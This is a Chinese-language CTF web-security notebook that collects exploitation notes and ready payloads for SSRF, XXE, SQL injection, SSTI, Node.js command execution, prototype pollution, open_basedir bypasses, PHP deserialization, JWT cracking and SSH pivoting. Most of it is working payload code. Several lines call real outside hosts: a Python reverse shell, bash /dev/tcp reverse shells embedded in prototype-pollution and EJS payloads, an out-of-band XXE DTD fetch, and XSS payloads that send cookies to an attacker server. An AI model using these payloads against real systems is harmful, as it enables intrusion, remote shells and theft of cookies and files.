highlight_file(__FILE__);
error_reporting(0);

$data=base64_decode($_GET['data']);
$host=$_GET['host'];
$port=$_GET['port'];

$fp=fsockopen($host,intval($port),$error,$errstr,30);
if(!$fp) {
    die();
}
else {
    fwrite($fp,$data);
    while(!feof($data))
    {
        echo fgets($fp,128);
    }
    fclose($fp);
}
```

fsockopen函数可以被滥用来触发SSRF攻击，这是因为该函数允许从远程服务器上读取数据并与远程服务器建立连接。攻击者可以使用fsockopen函数来发送恶意请求，例如将远程服务器地址设置为攻击者控制的恶意服务器，然后尝试读取该服务器上的敏感数据或执行任意命令

`/index.php?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=`

即

```text
GET /flag.php HTTP/1.1
Host: 127.0.0.1
Connection: Close
```

## 又一个变量覆盖array_merge()

array_merge()

- 合并一个或多个数组.合并后参数2数组的内容附加在参数1之后。同时如果参数1、2数组中有相同的字符串键名
- 则合并后为参数2数组中对应键的值，发生了覆盖。//注意，会造成变量覆盖
- 然而，如果数组包含数字键名，后面的值将不会覆盖原来的值，而是附加到后面。
- 如果只给了一个数组并且该数组是数字索引的，则键名会以连续方式重新索引。

eg:

```php
<?php
$array1 = array("color" => "red", 2, 4);
$array2 = array("a", "b", "color" => "green", "shape" => "trapezoid", 4);
$result = array_merge($array1, $array2);
print_r($result);
?> 

//output

Array
(
    [color] => green
    [0] => 2
    [1] => 4
    [2] => a
    [3] => b
    [shape] => trapezoid
    [4] => 4
)
```

这道题太烦了,单独开了一个文章

## 报错信息很重要

[CISCN 2019华东南]Double Secret

从报错信息中发现是rc4加密并获得密钥

接下来就是普通的ssti模版了

## 又是一个quine replace

`$row['password'] === $password`

有这个就行了

## ssti模版注入加密

rc4 反转字符串等

总之找到注入点多次测试再按照加密更改payload即可

## xml

[NCTF 2019]Fake XML

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "file:///flag">
  ]>
<user><username>&admin;</username><password>123456</password></user>
```

## update注入

[HUBUCTF 2022 新生赛]ezsql

`nickname=hhh&age=23, password=0x3230326362393632616335393037356239363462303731353264323334623730%23`

需要多次测试找到注入点,还有就是为什么这样能修改所有人的密码

## go也有ssti

后日谈

## php提前触发gc

prize_p1
`unset`可以提前回收,当对象为`NULL`的时候也可以提前回收

注意修复`phar`签名的时候用的是sha1还是sha256

## xxe

ctfshow web373-378

```php
// 允许加载外部实体
libxml_disable_entity_loader(false);
// xml文件来源于数据流
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
// 加载xml实体，参数为替代实体、加载外部子集
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
// 把 DOM 节点转换为 SimpleXMLElement 对象
    $creds = simplexml_import_dom($dom);
// 节点嵌套
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
```

payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE payload [
<!ELEMENT payload ANY>
<!ENTITY xxe SYSTEM "file:///flag">
]>
<creds>
<ctfshow>&xxe;</ctfshow>
</creds>

another

<!DOCTYPE creds [
<!ELEMENT creds ANY>
<!ENTITY a SYSTEM "file:///flag">
]>
<user><username>&a;</username><password>1</password></user>
```

如果没有`echo`,那应该怎么办呢

答案是远程服务器
远程服务器配置好了,payload如下

```xml
<?xml version="1.1"?>
<!DOCTYPE ANY [
<!ENTITY % remote SYSTEM "http://43.143.239.235/xxe.dtd">
%remote;
]>
```

如果过滤了`http`就用`ftp` 或者`utf-16`绕过

```py
import requests

url = "http://bc5a33d7-d201-47cb-9ca8-65de9691bd9f.challenge.ctf.show/"
data = """<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://ip:port/evil.dtd">
%aaa;
]>
<xxe>1</xxe>
"""
requests.post(url ,data=data.encode('utf-16'))
```

一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。

`iconv -f UTF-8 -t UTF-16BE xxe.xml > xxe16be.xml`

## php_value auto_prepend_file

2020羊城杯easyphp

`.htaccess`也可以和`.user.ini`一样

```php
php_value auto_prepend_fil\
e .htaccess
#<?php system('cat /fla?');?>\
```

`\`连接上下文 #是注释

要url编码`?filename=.htaccess&content=php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system('cat%20/fla?')%3B%3F%3E%5C`

## pcre

preg_match只匹配第一行。当有换行符的时候就不会匹配
`{%0a"cmd":"/bin/cat%20/home/r*/f*"%0a}`

回溯限制

默认是100万
可以在`.htaccess`中设置
`php_value pcre.backtrack_limit 0`
`php_value pcre.jit 0`

利用大概像这样

```py
import requests
payload = '{"cmd":"/bin/cat /home/rceservice/flag","test":"' + "a"*(1000000) + '"}'
res = requests.post("http://f0b3a32e-1633-47fc-b006-ec46a6cfc17e.node3.buuoj.cn/", data={"cmd":payload})
print(res.text)
```

## 同或

同或 !=! 的逻辑：
1 !=! 1 == true
1 !=! 0 == false
0 !=! 1 == false
0 !=! 0 == true

是这意思吗

## hash_hmac()

如果第二个参数是数组,那么返回NULL
那么如果再次调用第一次调用后的 结果就可控了

## proc下cmdline cwd exe environ fd self

### cmdline

存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令

`cat /proc/*/cmdline`-->`/usr/bin/docker-proxy`

### cwd

cwd文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录

`ls -al /proc/*/cwd`-->`/var/lib/postgresql/9.5/main`
`ls /var/lib/postgresql/9.5/main`<-->`ls /proc/*/cwd`

### exe

exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径

`ls -al /proc/*/exe`-->`/usr/lib/postgresql/9.5/bin/postgres`

### environ

environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息

### fd

fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容

查看指定进程打开的某个文件的内容：

`ls -al /proc/*/fd/4`

如果一个程序用`open()`打开了一个文件但最终没有关闭他，即便从外部（如`os.remove(SECRET_FILE)`）删除这个文件之后，在 `/proc` 这个进程的 `pid` 目录下的 `fd` 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容

### self

`/proc/self` 表示当前进程目录

### 注意

在真正做题的时候，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取`/proc/self/cmdline`的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如文件包含漏洞，或者SSTI使用file模块读取文件）的方式读取`/proc/self/cmdline`

`cat /proc/*/fd/*`

## 反弹shell

python
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

## $_REQUEST $_SERVER['QUERY_STRING']

`$_REQUEST`有个特性就是当GET和POST有相同的变量时，匹配POST的变量

`$_SERVER['QUERY_STRING']`匹配的是原始数据，就是没有url编码过的数据，所以可以使用url编码绕过

```php
1，http://localhost/aaa/(打开aaa中的index.php)
结果：
$_SERVER['QUERY_STRING'] = "";
$_SERVER['REQUEST_URI']

= "/aaa/";
$_SERVER['SCRIPT_NAME']  = "/aaa/index.php";
$_SERVER['PHP_SELF']    = "/aaa/index.php";

2， http://localhost/aaa/?p=222(附带查询)
结果：
$_SERVER['QUERY_STRING'] = "p=222";
$_SERVER['REQUEST_URI']  = "/aaa/?p=222";
$_SERVER['SCRIPT_NAME']  = "/aaa/index.php";
$_SERVER['PHP_SELF']    = "/aaa/index.php";

3，http://localhost/aaa/index.php?p=222&q=333
结果：
$_SERVER['QUERY_STRING'] = "p=222&q=333";
$_SERVER['REQUEST_URI']  ="/aaa/index.php?p=222&q=333";
$_SERVER['SCRIPT_NAME']  = "/aaa/index.php";
$_SERVER['PHP_SELF']    = "/aaa/index.php";

由实例可知：
$_SERVER[" QUERY_STRING"] 获取查询 语句，实例中可知，获取的是?后面的值
$_SERVER[" REQUEST_URI"]  获取 http://localhost 后面的值，包括/
$_SERVER[" SCRIPT_NAME"]  获取当前脚本的路径，如：index.php
$_SERVER[" PHP_SELF"]     当前正在执行脚本的文件名
```

## 万能密码

```sql
' or 1='1
'or'='or'
admin
admin'--
admin' or 4=4--
admin' or '1'='1'--
admin888
"or "a"="a
admin' or 2=2#
a' having 1=1#
a' having 1=1--
admin' or '2'='2
')or('a'='a
or 4=4--
c
a'or' 4=4--
"or 4=4--
'or'a'='a
"or"="a'='a
'or''='
'or'='or'
1 or '1'='1'=1
1 or '1'='1' or 4=4
'OR 4=4%00
"or 4=4%00
'xor
admin' UNION Select 1,1,1 FROM admin Where ''='
1
-1%cf' union select 1,1,1 as password,1,1,1 %23
1
17..admin' or 'a'='a 密码随便
'or'='or'
something
' OR '1'='1
1'or'1'='1
admin' OR 4=4/*
1'or'1'='1
'or 4=4/* 
```

## 二次注入

- 由于开发者为了防御sql注入，使网站对我们输入的恶意语句中的一些重要的关键字进行了转义，使恶意的注入，使网站对我们输入的恶意语句中的一些重要的关键字进行了转义，使恶意的sql注入注入无法执行（比如说将单引号转义，使其无法闭合）无法执行（比如说将单引号转义，使其无法闭合）。
- 但是数据库存储我们的数据时，输入的恶意的语句又被还原成转义之前的语句（数据库又没有对存储的数据进行但是数据库存储我们的数据时，输入的恶意的语句又被还原成转义之前的语句（数据库又没有对存储的数据进行检查，默认存储的数据都是无害的）检查，默认存储的数据都是无害的）
- 这时仍然没有被攻击，但是当我们数据库在进行查询时，如果调用了这条信息，就可能会产生这时仍然没有被攻击，但是当我们数据库在进行查询时，如果调用了这条信息，就可能会产生sql注入。注入。

所以要说明的是，二次注入的产生是需要以上一些特定的条件的。所以二次注入一般比较难发现所以要说明的是，二次注入的产生是需要以上一些特定的条件的。所以二次注入一般比较难发现。
二次注入常出现的地方二次注入常出现的地方

- 用户注册和登陆用户注册和登陆
- 用户修改密码用户修改密码

`[October 2019]Twice SQL Injection`

在这道题里,info修改会在`'`前转义,但是在注册时用户名可以注入,在登录后进行二次注入

## sqlite数据库

```sql
sqlite的系统表sqlite_master
type 记录项目的类型，如table、index、view、trigger
name 记录项目的名称，如表名、索引名等
tbl_name 记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身
rootpage 记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL
sql 记录创建该项目的SQL语句
所以使用select group_concat(name) from sqlite_master where type='table' 来查表名
使用select group_concat(sql) from sqlite_master where type='table' and name='xxxx'来获取建表语句从而得到字段名
```

## nodejs

### 大小写绕过

对于`toUpperCase()`:字符`"ı"`、`"ſ"`经过toUpperCase处理后结果为 "I"、"S"
对于`toLowerCase()`:字符`"K"`经过toLowerCase处理后结果为"k"(这个K不是K)

`name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password`

可以大小写绕过,也可以大小写漏洞
`在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。`
`在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。`

### eval命令执行

web 335-?

- execSync
`require('child_process').execSync('cat fl00g.txt').toString()`
`require('child_process')['exe\cSync']('tac%20f*')` 感觉和ssti有点像了`.`和`['']`都可以

- spawnSync
`/?eval=require('child_process').spawnSync('ls').stdout.toString()`
`/?eval=require('child_process').spawnSync('cat',['fl001g.txt']).stdout.toString()`

fs模块
`/?eval=require('fs').readdirSync('.')`-->读取当前目录下的文件
`/?eval=require('fs').readFileSync('fl001g.txt','utf-8')`-->读取flag文件
`/?eval=__filename`-->当前模块的绝对路径
`/?eval=require('fs').readFileSync('/app/routes/index.js','utf-8')`

类似命令
间隔两秒执行函数：
`setInteval(some_function, 2000)`
两秒后执行函数：
`setTimeout(some_function, 2000);`
some_function处就类似于eval函数的参数

输出HelloWorld：
`Function("console.log('HelloWolrd')")()`
类似于php中的create_function

以上都可以导致命令执行

数组绕过

```js
a={'x':'1'}
b={'x':'2'}

console.log(a+"flag{xxx}")
console.log(b+"flag{xxx}")
```

### 原型链污染

原型污染是一种攻击，攻击者尝试修改对象的原型。如果成功，攻击者可能能够添加或修改对象的属性或方法
对于语句：`object[a][b] = value` 如果可以控制a、b、value的值，将a设置为`__proto__`，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。

可能发生的位置

- 对象merge
- 对象clone（其实内核就是将待操作的对象merge到一个空对象中）

举个例子

```js
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
```

这里要用json以免`__proto__`被解析成原型而不是键名

```js

{"username":"1","password":"1",
"__proto__":{"ctfshow":"36dboy"}}

还可以反弹shell
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/1.14.127.40/9999 0>&1\"')"}}
```

### ejs rce

```js
{
        "constructor": {
            "prototype": {
            "outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/1.14.127.40/9999 0>&1\"');var __tmp2"
            }
        }
    }
```

`{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/1.14.127.40/9999 0>&1\"');var __tmp2"}}}`

### ez_calc

发现flag的名字很长，直接读取的话长度不够，而且这里过滤了x，也无法直接利用exec，但是实际上这里是可以绕过的，因为我们通过`require`导入的模块是一个`Object`，那么就可以通过`Object.values`获取到`child_process`里面的各种方法，那么再通过数组下标[5]就可以得到`execSync`了，那么有了`execSync`后就可以通过写入文件的方式读取flag了，payload如下:

`calc[]=Object.values(require('child_process'))[5]('cat${IFS}/G*>p')&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=1&calc[]=.`
遍历一下当前目录发现p已经成功写入，接下来读取p就行了，记得带上回显，用nl读就行：

`calc[]=require('child_process').spawnSync('nl',['p']).stdout.toString();...`

### ast注入+pug模版

```js
{
  "__proto__.hero":{
    "name":"奇亚纳"
},
"__proto__.block": {
    "type": "Text", 
    "line": "process.mainModule.require('child_process').execSync('cat /flag > /app/static/1.txt')"
    }
}
```

### safe-url

poc

```js
?delay=2147483648
 
e=(function () {
  const process = clearImmediate.constructor("return process;")();
  return process.mainModule.require("child_process").execSync("cat /flag").toString()
})()
```

## 死亡绕过

```php
public function hasaki(){
        $d = '<?php die("nononon");?>';
        $a = $d.$this->text;
         @file_put_contents($this->file,$a);
}
```

像这样的

### base64编码后解码绕过

base64在解码的时候，是4个字节转化为3个字节

eg:`file_put_contents($filename , "<?php exit();".$content);`
在解码的过程中，字符`< ? ; >` 空格等一共有7个字符不符合`base64`编码的字符范围将被忽略，所以最终被解码的字符仅有`phpexit`和我们传入的其他字符

### filter

#### string.strip_tags配合base64

`string.strip_tags`把整个标签都给去掉了可以直接写入内容了

`php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php";`
`$content = "PD9waHAgc3lzdGVtKCRfUE9TVFthXSk7";// <?php system($_POST[a]);`

#### rot13

`<?php phpinfo();>`经过rot13编码后这样：`<?cuc cucvasb();?>`

[放一个链接](https://www.freebuf.com/articles/web/266565.html)

`file_put_contents`用过滤器,当你写入数据时，数据首先会通过过滤器，然后再写入文件。

## php ssti

### smarty

```php
{$smarty.version}      #获取smarty的版本号
{php}phpinfo();{/php}  #执行相应的php代码
<script language="php">phpinfo();</script>   #{literal} 可以让一个模板区域的字符原样输出, 这经常用于保护页面上的Javascript或css样式表
这种写法只适用于php5环境
{if phpinfo()}{/if}     #每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}
```

```php
{if phpinfo()}{/if}
{if system('ls')}{/if}
{if readfile('/flag')}{/if}
{if show_source('/flag')}{/if}
{if system('cat ../../../../flag')}{/if}
```

### twig

```py
#读文件
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("find / -name flag")}}
{{'/etc/passwd'|file_excerpt(1,30)}}
 
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(20)}}
```

```py
#常见payload
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
{{["id"]|map("system")|join(",")}}
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{["id",0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0,0]|reduce("system","id")|join(",")}}
{{['cat /etc/passwd']|filter('system')}}
```

## jwt

网站[https://jwt.io/](https://jwt.io/)

工具

- hashcat
`hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5MjU0NzEyOCwiZXhwIjoxNjkyNTU0MzI4LCJuYmYiOjE2OTI1NDcxMjgsInN1YiI6InVzZXIiLCJqdGkiOiIxMTBjMzkyMjQ2NTI0ZTViZTgyNDgwMmM5YTJjNzYwYiJ9.wgVjJpPREW4k2YfHHF7BX2iUlJYeQO4XOM2W5kEY0Q4 jwt.secrets.list`

- jwt_tool
- jwt-cracker
- flask-session-cookie

JWT的本质就是一个字符串，它是将用户信息保存到一个Json字符串中，然后进行编码后得到一个JWT token，并且这个JWT token带有签名信息，接收后可以校验是否被篡改，所以可以用于在各方之间安全地将信息作为Json对象传输。

JWT由3部分组成：标头(Header)、有效载荷(Payload)和签名(Signature)。在传输的时候，会将JWT的3部分分别进行Base64编码后用.进行连接形成最终传输的字符串
`JWTString = Base64(Header).Base64(Payload).HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)`

公私钥泄露可以伪造身份

可以根据公钥，修改算法从 非对称算法（比如RS256） 到 对称密钥算法（HS256）
双方都使用公钥验签，顺利篡改数据

还有老生常谈的session伪造,记得注意python环境,另外可能需要读取到`/sys/class/net/eth0/address`mac地址来获得secret_key
`python flask_session_cookie_manager3.py decode -c "session值" -s "key值"`
`python flask_session_cookie_manager3.py encode -s "key值" -t "我们需要伪造的值"`

## xss

最常见的利用,插入`<script>`标签

`<script>document.location.href='http://43.143.239.235/cdd.php?cookie='+document.cookie</script>`

过滤`<script>`标签
可以用`<body>`标签
`<body onload="document.location.href='http://43.143.239.235/cdd.php?cookie='+document.cookie"></body>`

过滤`<img>`标签
还是body

过滤空格
可以用`tab`键或者注释`\**\`或者`\`代替
`<body/**/onload="document.location.href='http://43.143.239.235/cdd.php?cookie='+document.cookie"></body>`

发送源码

`<script>$('.laytable-cell-1-0-1').each(function(index,value){if(value.innerHTML.indexOf('ctf'+'show{')>-1){window.location.href='http://43.143.239.235/cdd.php?cookie='+value.innerHTML;}});</script>`

`var img = new Image(); img.src = "http://your-domain/cookie.php?cookie="+document.querySelector('#top > div.layui-container').tex tContent; document.body.append(img);`

`<script src="http://43.143.239.235/cdd.js"></script>`(没有成功QWQ)

[留个链接](https://www.cnblogs.com/hookjoy/p/6181350.html)

### csp

留着

## go1.15

如果是`CONNECT`方式请求，就不会处理url中的特殊字符。导致直接读取flag.其他的请求方法都会在`cleanPath`中被处理url,路径穿越

## python代码审计

1.内置危险函数

exec

execfile

eval

2.标准库危险模块

os

subprocess

commands

3.危险第三方库

Template(user_input) : 模板注入(SSTI)所产生的代码执行

subprocess32

4.反序列化

marshal

PyYAML

pickle和cpickle

shelve

PIL

unzip

## 内网渗透

形如`ssh ctfshow@pwn.challenge.ctf.show -p28143`

首先ssh连接,在/home目录下创建对应用户并chmod 777

然后transmit连接上传`fscan_amd64`

`ifconfig`后扫描内网

msf攻击可疑端口

```bash
msfconsole
use exploit/linux/samba/is_known_pipename
set rhost 172.2.123.6
exploit 
```

### 单层ssh隧道

本地端口转发

`ssh -L 8085:172.2.136.5:80 ctfshow@pwn.challenge.ctf.show -p 28227`

### 多层ssh隧道

`window攻击机->linux机器(可控)->与linux机器在同一个内网内的其他机器`

因为直接用拿下权限的linux机器作为攻击机显然很麻烦，很多工具都不在，所以我们一般都会把这台机器作为工具搭建内网隧道，这样我们就可以用window攻击机访问深层内网的其他机器了，还是以上面那个题作为例子，这次我们把过程变复杂一点。

这是我的vps，我们用vps把中可控linux机器内网中ip为172.2.136.5的80端口转发到本地9383端口：

```bash
ssh -L 9383:172.2.136.5:80 ctfshow@pwn.challenge.ctf.show -p 28227
```

然后我们用同样方式，把远程vps上的9383端口转发到本地的8086端口：

```bash
ssh -L 8085:172.2.136.5:80 root@vps_ip -p vps_port
```

过程就是：远程主机172.2.136.5的80端口转发到vps的9383端口，再把vps的9383端口转发到本地window机器的8085端口，因此我们通过访问本地window机器的8085端口就可以访问远程主机内网中172.2.136.5的80端口上的服务

## phar新理解

### 能够触发phar反序列化的类

```php
fopen() unlink() stat() fstat() fseek() rename() opendir() rmdir() mkdir() file_put_contents() file_get_contents() 
file_exists() fileinode() include() require() include_once require_once() filemtime() fileowner() fileperms() 
filesize() is_dir() scandir() rmdir() highlight_file()
//外加一个类
new DirectoryIteartor() 
```

## open_basedir

重新看一遍

用open_basedir指定的**限制实际上是前缀，而不是目录名**

### 命令执行

`open_basedir`对命令执行没有限制,实测`system`函数可以不受到其限制

而`file_get_contents`则会受到限制

但是`system`函数一般都被禁用了,用不到

### symlink

先介绍一下符号链接

> 符号链接又叫软链接，是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身。

#### symlink()函数

(PHP 4, PHP 5, PHP 7)

symlink()函数创建一个从指定名称连接的现存目标文件开始的符号连接。如果成功，该函数返回TRUE；如果失败，则返回FALSE。

```bash
symlink ( string $target , string $link ) : bool
```

| 参数   | 描述               |
| ------ | ------------------ |
| target | 必需。连接的目标。 |
| link   | 必需。连接的名称。 |

当然一般情况下这个target是受限于open_basedir的。

先给出payload，原理在后面说明，这里需要跨几层目录就需要创建几层目录：

```php
<?php
mkdir("A");
chdir("A");
mkdir("B");
chdir("B");
mkdir("C");
chdir("C");
mkdir("D");
chdir("D");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
symlink("A/B/C/D","7ea");
symlink("7ea/../../../../etc/passwd","exp");
unlink("7ea");
mkdir("7ea");
?>
```

访问该PHP文件后，后台便生成了两个目录和一个名为exp的符号链接：

在Web中我们直接访问exp即可读取到目标文件：

原理就是：创建一个链接文件7ea，用相对路径指向A/B/C/D，再创建一个链接文件exp指向7ea/../../../../etc/passwd。其实指向的就是A/B/C/D/../../../../etc/passwd，其实就是/etc/passwd。这时候删除7ea，再创建一个7ea目录，但exp还是指向7ea/../../../etc/passwd，所以就成功跨到/etc/passwd了

### glob://伪协议

只是用glob://伪协议是无法直接绕过的，它需要结合其他函数组合利用，主要有以下两种利用方式，局限性在于它们都只能列出根目录下和open_basedir指定的目录下的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。

#### 方式1——DirectoryIterator+glob://

DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。

DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件：

```php
<?php
$c = $_GET['c'];
$a = new DirectoryIterator($c);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```

输入`glob:///*`即可列出根目录下的文件，但是会发现只能列根目录和open_basedir指定的目录的文件

#### 方式2——opendir()+readdir()+glob://

opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目。

这里结合两个函数来列举根目录中的文件：

```php
<?php
$a = $_GET['c'];
if ( $b = opendir($a) ) {
    while ( ($file = readdir($b)) !== false ) {
        echo $file."<br>";
    }
    closedir($b);
}
?>
```

效果和方式1是一样的，只能Bypass open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件。

### 利用chdir()与ini_set()组合Bypass

测试Demo，放置在Web根目录下，在执行输入参数的PHP代码前后获取open_basedir的值看是否改变了：

```php
<?php
echo 'open_basedir: '.ini_get('open_basedir').'<br>';
echo 'GET: '.$_GET['c'].'<br>';
eval($_GET['c']);
echo 'open_basedir: '.ini_get('open_basedir');
?>
```

输入以下payload：

```php
mkdir('mi1k7ea');chdir('mi1k7ea');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/etc/passwd');
```

可以看到open_basedir被设置为’/‘了，整个失去了效果

### 利用bindtextdomain()函数Bypass

(PHP 4, PHP 5, PHP 7)

bindtextdomain()函数用于绑定domain到某个目录的函数。

函数定义如下：

```bash
bindtextdomain ( string $domain , string $directory ) : string
```

#### Bypass

利用原理是基于报错：bindtextdomain()函数的第二个参数\$directory是一个文件路径，它会在\$directory存在的时候返回\$directory，不存在则返回false。

payload：

```php
<?php
printf('<b>open_basedir: %s</b><br />', ini_get('open_basedir'));
$re = bindtextdomain('xxx', $_GET['dir']);
var_dump($re);
?>
```

只能应用于判断目标文件是否存在，有利于后续和其他漏洞进行组合利用。

### 利用SplFileInfo::getRealPath()类方法Bypass

#### SplFileInfo类

(PHP 5 >= 5.1.2, PHP 7)

SplFileInfo类为单个文件的信息提供高级面向对象的接口。

`SplFileInfo::getRealPath`

(PHP 5 >= 5.2.2, PHP 7)

SplFileInfo::getRealPath类方法是用于获取文件的绝对路径。

和bindtextdomain的原理一样，是基于报错的方式，返回结果都是一样的，就不再多演示，这里直接给出payload：

```php
<?php
echo '<b>open_basedir: ' . ini_get('open_basedir') . '</b><br />';
$info = new SplFileInfo($_GET['dir']);
var_dump($info->getRealPath());
?>
```

### 利用realpath()函数Bypass

(PHP 4, PHP 5, PHP 7)

realpath — 返回规范化的绝对路径名。它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。

函数定义如下：

```php
realpath ( string $path ) : string
```

环境条件：Windows

基本原理是基于报错返回内容的不用，设置自定义的错误处理函数，循环遍历匹配到正则的报错信息的字符来逐个拼接成存在的文件名，另外是需要结合利用Windows下的两个特殊的通配符<和>，不然只能进行暴破。

payload：

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'E:/wamp64/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) {
        $file = $dir . $chars[$i] . '<><';
        realpath($file);
}
function isexists($errno, $errstr)
{
        $regexp = '/File\((.*)\) is not within/';
        preg_match($regexp, $errstr, $matches);
        if (isset($matches[1])) {
                printf("%s <br/>", $matches[1]);
        }
}
?>
```

可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：

![img](https://img.siren.blue/img/Bypass-open-basedir10.png)

## php7.3.x wakeup绕过

```py
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-03-24 10:16:33
# @Last Modified by:   h1xa
# @Last Modified time: 2023-03-25 00:25:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

//error_reporting(0);

class ctfshow {
    public $ctfshow;

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        echo "OK";
        system($this->ctfshow);
    }
     

}
$a=new ctfshow;
$a->ctfshow="ls";
$arr=array("evil"=>$a);
$oa=new ArrayIterator($arr);
$res=serialize($oa);
echo $res;
#$res='C:11:"ArrayObject":67:{x:i:0;a:1:{s:4:"evil";O:8:"Saferman":1:{s:5:"check";b:1;}};m:a:0:{}}';
#unserialize($res);

?>

```

经过所有测试发现可以用的类为：
● ArrayObject::unserialize
● ArrayIterator::unserialize
● RecursiveArrayIterator::unserialize
● SplObjectStorage::unserialize

但是7.4.33(指名蓝帽杯)测试失败

## 初识侧信道

祖传脚本记好了

`file($_GET[1])`直接爆数据

## 环境变量

env**命令**可以显示当前用户的环境变量，还可以用来在指定[环境变量](http://fangfang0717.blog.51cto.com/236466/48703/)下执行其他命令

env查看有哪些环境变量，并且可以用$ 变量读取env中的变量名对应的变量值

